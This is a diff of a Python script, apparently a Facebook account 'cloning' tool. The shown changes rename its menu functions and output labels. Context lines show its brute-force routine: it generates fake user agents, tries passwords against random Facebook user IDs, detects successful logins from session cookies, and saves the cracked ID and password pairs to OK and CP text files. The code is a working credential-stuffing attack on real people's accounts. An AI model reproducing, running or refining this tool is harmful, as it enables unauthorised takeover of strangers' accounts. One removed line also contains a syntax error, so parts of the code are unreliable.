@@ -112,8 +112,7 @@ for xd in range(25000):
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 
-logo=("""
-【﻿ＭＡＦＩＡ】
+logo=("""【﻿ＭＡＩＦＡ】
 \33[1;37m----------------------------------------------
 →   Owner      :  ZAYN KHAN
 →   Facebook   :  Zayn Khan
@@ -146,7 +145,7 @@ def dynamic(text):
         print('\r'+text+o),
         sys.stdout.flush();time.sleep(1)
 
-def Zayn():
+def usman():
 	os.system('clear')
 	print(logo)
 	print('[1] Pak Random Cloning menu')
@@ -155,21 +154,21 @@ def Zayn():
 	print('[4] Join Facebook Group')
 	print('\x1b[1;91m[5] Exit Main menu')
 	print('\33[1;37m----------------------------------------------')
-	Zayn1 = input('[•] Select option  : ')
-	if Zayn1 =='1':
-		os.system('xdg-open https://facebook.com/ZaynMeharu')
+	usman1 = input('[•] Select option  : ')
+	if usman1 =='1':
+		os.system('xdg-open https://www.facebook.com/ZaynMeharu')
 		annu()
-	if Zayn1 =='5':
-		Zayn()
-	if Zayn1 =='3':
-		os.system('xdg-open https://facebook.com/ZaynMeharu')
-	if Zayn1 =='4':1
-		os.system('xdg-open https://facebook.com/ZaynMeharu');Zayn()
-	if Zayn1 =='2':
+	if usman1 =='5':
+		usman()
+	if usman1 =='3':
+		os.system('xdg-open https://www.facebook.com/ZaynMeharu')
+	if usman1 =='4':
+		os.system('xdg-open https://www.facebook.com/ZaynMeharu');usman()
+	if usman1 =='2':
 		bangla()
 	else:
 		print('\n\033[1;31mChoose valid option\033[0;97m')
-		Zayn()
+		usman()
 
 def annu():
     os.system('clear')
@@ -179,15 +178,15 @@ def annu():
     print('\x1b[1;97m[3] Random Method \x1b[1;92m3')
     print('\x1b[1;91m[4] Go to main menu')
     lines()
-    Zayn1 = input('[+] CHOOSE optION : ')
-    if Zayn1 =='1':
+    usman1 = input('[+] CHOOSE optION : ')
+    if usman1 =='1':
     	m1()
-    if Zayn1 =='2':
+    if usman1 =='2':
     	m2()
-    if Zayn1 =='3':
+    if usman1 =='3':
     	m3()
-    if Zayn1 =='4':
-    	Zayn()
+    if usman1 =='4':
+    	usman()
     else:
         print('\n\033[1;37m[+] SELECT VALID optION\033[0;97m')        
 #
@@ -198,13 +197,13 @@ def bangla():
 	print('\x1b[1;97m[1] Bngla Crack \x1b[1;92mM 1')
 	print('\x1b[1;91m[3] Go to main menu')
 	lines()
-	Zayn1 = input('[+] Select option : ')
-	if Zayn1 =='1':
+	usman1 = input('[+] Select option : ')
+	if usman1 =='1':
 		b1()
-	if Zayn1 =='2':
+	if usman1 =='2':
 		b2()
-	if Zayn1 =='3':
-		Zayn()
+	if usman1 =='3':
+		usman()
 #def choice()
 #
 
@@ -243,7 +242,7 @@ def m1():
     print('IDZ SAVED IN OK.txt : CP.txt')
     print(46*'-')
     print('The Process Has Been Complete')
-    print('Press Enter to Back');Zayn()
+    print('Press Enter to Back');usman()
 #
 def m2():
     user=[]
@@ -280,7 +279,7 @@ def m2():
     print('IDZ SAVED IN OK.txt : CP.txt')
     print(46*'-')
     print('The Process Has Been Complete')
-    print('Press Enter to Back');Zayn()
+    print('Press Enter to Back');usman()
 #
 def m3():
     user=[]
@@ -318,7 +317,7 @@ def m3():
     print('IDZ SAVED IN OK.txt : CP.txt')
     print(46*'-')
     print('The Process Has Been Complete')
-    print('Press Enter to Back');Zayn()
+    print('Press Enter to Back');usman()
 #
 #
 def b1():
@@ -357,7 +356,7 @@ def b1():
     print('IDZ SAVED IN OK.txt : CP.txt')
     print(46*'-')
     print('The Process Has Been Complete')
-    print('Press Enter to Back');Zayn()
+    print('Press Enter to Back');usman()
 #
 def b2():
     user=[]
@@ -394,7 +393,7 @@ def b2():
     print('IDZ SAVED IN OK.txt : CP.txt')
     print(46*'-')
     print('The Process Has Been Complete')
-    print('Press Enter to Back');Zayn()
+    print('Press Enter to Back');usman()
 
 #
 def rcrack(uid,pwx,tl):
@@ -439,23 +438,23 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[151:166]
-                print('\033[1;32m[HINA-XD -OK] '+uid+'|'+ps+'\033[0;97m')
-                open('HINA-XD -OK.txt', 'a').write(uid+' | '+ps+ '\n')
+                print('\033[1;32m[ZAYN-XD -OK] '+uid+'|'+ps+'\033[0;97m')
+                open('ZAYN-XD -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;31m[HINA-XD -CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('HINA-XD -CP.txt', 'a').write(uid+' | '+ps+'\n')
+                print('\033[1;31m[ZAYN-XD -CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('ZAYN-XD -CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mHINA-XD \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mZAYN-XD \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
 
-Zayn()
+usman()
